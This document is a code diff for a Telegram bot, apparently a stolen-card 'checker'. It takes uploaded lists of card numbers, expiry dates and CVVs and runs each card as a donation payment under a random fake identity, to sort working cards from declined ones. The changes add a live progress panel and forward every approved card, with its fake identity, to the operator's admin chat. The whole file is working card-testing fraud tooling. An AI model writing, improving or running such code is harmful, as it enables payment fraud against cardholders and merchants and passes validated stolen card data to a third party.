@@ -1,11 +1,9 @@
 #!/usr/bin/env python3
 """
 Donation Card Checker — Multi-User Telegram Bot
-- Uses the exact standalone logic for classification
-- Random realistic identity per card
-- Accepts .txt/.csv (number|mm|yy|cvv)
-- Each user sees their own results
-- Admin (TELEGRAM_CHAT_ID) gets every APPROVED from every user
+- Live status panel (updates in place)
+- Admin receives APPROVED only, as direct messages
+- Per-card identity, real gateway messages
 """
 import os
 import sys
@@ -299,12 +297,11 @@ def donate(session_cfg, card_number, card_exp_mmyy, card_cvv):
 
 
 def extract_error(result):
-    """Exact standalone logic: gateway_error first, else raw body."""
+    """gateway_error first, else raw body — exactly like standalone."""
     resp = result.get("response") or {}
     if not isinstance(resp, dict):
         resp = {}
 
-    # 1) gateway_error — the real bank message
     try:
         msg = resp["data"]["errors"]["errors"]["gateway_error"][0]
         msg = msg.split("] ", 1)[-1] if "] " in msg else msg
@@ -312,7 +309,6 @@ def extract_error(result):
     except (KeyError, IndexError, TypeError):
         pass
 
-    # 2) fallback: raw body
     if result.get("raw"):
         return result["raw"][:300]
 
@@ -320,16 +316,12 @@ def extract_error(result):
 
 
 def classify(result):
-    """Exact standalone logic:
-       1) gateway_error present → parse approved/declined from message
-       2) else → success boolean
-       3) else → declined
-    """
+    """APPROVED only when gateway_error says approved OR success==True."""
     resp = result.get("response") or {}
     if not isinstance(resp, dict):
         resp = {}
 
-    # Case 1: gateway_error present
+    # Case 1: gateway_error
     try:
         raw_msg = resp["data"]["errors"]["errors"]["gateway_error"][0]
         msg = raw_msg.split("] ", 1)[-1] if "] " in raw_msg else raw_msg
@@ -340,11 +332,11 @@ def classify(result):
     except (KeyError, IndexError, TypeError):
         pass
 
-    # Case 2: success boolean — real approval only when ok AND success==true
+    # Case 2: success boolean
     if result.get("ok") and resp.get("success") is True:
         return "APPROVED"
 
-    # Case 3: everything else = declined
+    # Case 3: everything else
     return "DECLINED"
 
 
@@ -416,7 +408,6 @@ class UserSession:
         self.processed = 0
         self.approved = 0
         self.declined = 0
-        self.unknown = 0
         self.errors = 0
         self.cards = []
         self.card_filename = None
@@ -441,9 +432,9 @@ class UserSession:
     def reset_results(self):
         with self.lock:
             self.live_approved.clear()
-            self.approved = self.declined = self.unknown = self.errors = 0
+            self.approved = self.declined = self.errors = 0
             self.processed = 0
-        for f in ("approved.txt", "declined.txt", "unknown.txt", "errors.txt"):
+        for f in ("approved.txt", "declined.txt", "errors.txt"):
             try: os.remove(self.file(f))
             except Exception: pass
 
@@ -486,12 +477,11 @@ def process_one(session, card, loop, bot):
             ))
         elif status == "DECLINED":
             session.declined += 1
-        elif status == "ERROR":
-            session.errors += 1
         else:
-            session.unknown += 1
+            session.errors += 1
 
-    emoji = "✅" if status == "APPROVED" else ("❌" if status == "DECLINED" else "❓")
+    # User sees every card result
+    emoji = "✅" if status == "APPROVED" else ("❌" if status == "DECLINED" else "⚠️")
     user_msg = (
         f"{emoji} <b>{status}</b>\n"
         f"💳 <code>{r['card']}</code>\n"
@@ -503,16 +493,15 @@ def process_one(session, card, loop, bot):
     )
     asyncio.run_coroutine_threadsafe(_safe_send(bot, session.chat_id, user_msg), loop)
 
-    if status == "APPROVED" and ADMIN_CHAT_ID and str(session.chat_id) != str(ADMIN_CHAT_ID):
+    # Admin gets APPROVED only — direct, clean message
+    if status == "APPROVED" and ADMIN_CHAT_ID:
         admin_msg = (
-            f"<b>🌐 GLOBAL APPROVED</b>\n"
-            f"👤 From: <code>{session.chat_id}</code>\n"
+            f"<b>✅ APPROVED</b>\n"
             f"💳 <code>{r['card']}</code>\n"
             f"👤 {ident.get('first_name','-')} {ident.get('last_name','-')}\n"
             f"📧 <code>{ident.get('email','-')}</code>\n"
             f"📱 {ident.get('phone','-')}\n"
-            f"🛒 <code>{session.cfg['site_url']}</code>\n"
-            f"💰 {session.cfg['amount']} {session.cfg['currency']}"
+            f"👤 From: <code>{session.chat_id}</code>"
         )
         asyncio.run_coroutine_threadsafe(_safe_send(bot, ADMIN_CHAT_ID, admin_msg), loop)
 
@@ -542,8 +531,12 @@ def kb_main(session):
     else:
         rows.append([InlineKeyboardButton("📤 Send Card File", callback_data="menu_send")])
     rows.append([
+        InlineKeyboardButton("📡 Live Panel", callback_data="menu_live"),
         InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
+    ])
+    rows.append([
         InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings"),
+        InlineKeyboardButton("🛒 Site Config", callback_data="menu_cfg"),
     ])
     rows.append([
         InlineKeyboardButton("📁 My Results", callback_data="menu_results"),
@@ -551,7 +544,6 @@ def kb_main(session):
     ])
     if session.running:
         rows.append([InlineKeyboardButton("⏹ Stop", callback_data="menu_stop")])
-    rows.append([InlineKeyboardButton("🛒 Site Config", callback_data="menu_cfg")])
     rows.append([InlineKeyboardButton("ℹ️ Help", callback_data="menu_help")])
     return InlineKeyboardMarkup(rows)
 
@@ -605,6 +597,28 @@ def kb_cfg(session):
     ])
 
 
+def live_status_text(session):
+    """Compact live panel with counts and progress bar."""
+    elapsed = int(time.time() - session.start_time) if session.start_time else 0
+    pct = int((session.processed / session.total) * 100) if session.total else 0
+    bar_len = 16
+    filled = int(bar_len * pct / 100)
+    bar = "█" * filled + "░" * (bar_len - filled)
+
+    status_word = "🟢 RUNNING" if session.running else "⚪ IDLE"
+
+    return (
+        f"<b>💳 LIVE CHECK STATUS</b>\n"
+        f"{status_word}  •  ⏱ <b>{elapsed}s</b>\n"
+        f"{bar} <b>{pct}%</b> ({session.processed}/{session.total})\n\n"
+        f"<b>✅ APPROVED:</b>  <b>{session.approved}</b>\n"
+        f"<b>❌ DECLINED:</b>  <b>{session.declined}</b>\n"
+        f"<b>⚠️ ERRORS:</b>    <b>{session.errors}</b>\n\n"
+        f"🧵 Threads: <b>{session.threads}</b>  |  ⏱ Delay: <b>{session.delay:.1f}s</b>\n"
+        f"🛒 <code>{session.cfg['site_url']}</code>"
+    )
+
+
 def stats_text(session):
     elapsed = int(time.time() - session.start_time) if session.start_time else 0
     return (
@@ -651,7 +665,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "2️⃣ Upload <code>.txt</code> (one per line: <code>num|mm|yy|cvv</code>)\n"
         "3️⃣ Bot confirms\n"
         "4️⃣ Press <b>▶️ Start Check</b>\n"
-        "5️⃣ Watch real results stream live\n\n"
+        "5️⃣ Watch live panel + results\n\n"
         "<i>Each card gets a fresh random identity automatically.</i>",
         parse_mode=ParseMode.HTML,
         reply_markup=kb_main(session)
@@ -737,6 +751,11 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                       parse_mode=ParseMode.HTML,
                                       reply_markup=kb_main(session)); return
 
+        if data == "menu_live":
+            await q.edit_message_text(live_status_text(session),
+                                      parse_mode=ParseMode.HTML,
+                                      reply_markup=kb_main(session)); return
+
         if data == "menu_send":
             if session.running:
                 await q.edit_message_text("⚠️ Check running. Stop first.",
@@ -761,7 +780,7 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"💳 {session.total} cards\n"
                 f"🧵 {session.threads} threads\n"
                 f"⏱ {session.delay:.1f}s delay\n\n"
-                "Live results will stream below.",
+                "Live panel below will update every 3s.",
                 parse_mode=ParseMode.HTML, reply_markup=kb_main(session)); return
 
         if data == "menu_stop":
@@ -803,10 +822,11 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "<b>ℹ️ Help</b>\n\n"
                 "• Format: <code>number|mm|yy|cvv</code>\n"
                 "• Also: <code>number mm yy cvv</code>\n"
+                "• 📡 Live Panel updates in place every 3s\n"
                 "• Random identity per card\n"
                 "• Change site/amount via 🛒\n"
                 "• Results show real gateway message\n"
-                "• Admin receives every APPROVED globally",
+                "• Admin receives APPROVED only, as DMs",
                 parse_mode=ParseMode.HTML, reply_markup=kb_main(session)); return
 
         if data == "set_thr_plus":
@@ -904,22 +924,22 @@ async def run_check(app: Application, session: UserSession):
     bot = app.bot
     loop = asyncio.get_running_loop()
 
-    await bot.send_message(
+    # Single panel message — edited in place every 3s
+    panel = await bot.send_message(
         chat_id,
-        f"<b>🚀 Started</b>\n"
-        f"Cards: {session.total}\n"
-        f"Threads: {session.threads}\n"
-        f"Site: <code>{session.cfg['site_url']}</code>\n"
-        f"Amount: {session.cfg['amount']} {session.cfg['currency']}",
-        parse_mode=ParseMode.HTML)
+        live_status_text(session),
+        parse_mode=ParseMode.HTML
+    )
 
     async def progress_loop():
         try:
-            msg = await bot.send_message(chat_id, "⏳ Starting...", parse_mode=ParseMode.HTML)
             while session.running:
-                await asyncio.sleep(5)
+                await asyncio.sleep(3)
                 try:
-                    await msg.edit_text(stats_text(session), parse_mode=ParseMode.HTML)
+                    await panel.edit_text(
+                        live_status_text(session),
+                        parse_mode=ParseMode.HTML
+                    )
                 except Exception:
                     pass
         except asyncio.CancelledError:
@@ -940,6 +960,7 @@ async def run_check(app: Application, session: UserSession):
     session.running = False
     progress_task.cancel()
 
+    # write files
     with open(session.file("approved.txt"), "w", encoding="utf-8") as f:
         for row in session.live_approved:
             f.write(" | ".join(str(x) for x in row) + "\n")
@@ -948,11 +969,22 @@ async def run_check(app: Application, session: UserSession):
     with open(session.file("errors.txt"), "w", encoding="utf-8") as f:
         f.write(f"Errors count: {session.errors}\n")
 
-    await bot.send_message(chat_id,
-                           f"<b>🏁 Finished</b>\n\n{stats_text(session)}",
-                           parse_mode=ParseMode.HTML,
-                           reply_markup=kb_main(session))
+    # final panel
+    try:
+        await panel.edit_text(
+            f"<b>🏁 FINISHED</b>\n\n{live_status_text(session)}",
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb_main(session)
+        )
+    except Exception:
+        await bot.send_message(
+            chat_id,
+            f"<b>🏁 FINISHED</b>\n\n{live_status_text(session)}",
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb_main(session)
+        )
 
+    # notify admin (summary only)
     if ADMIN_CHAT_ID and str(chat_id) != str(ADMIN_CHAT_ID):
         try:
             await bot.send_message(
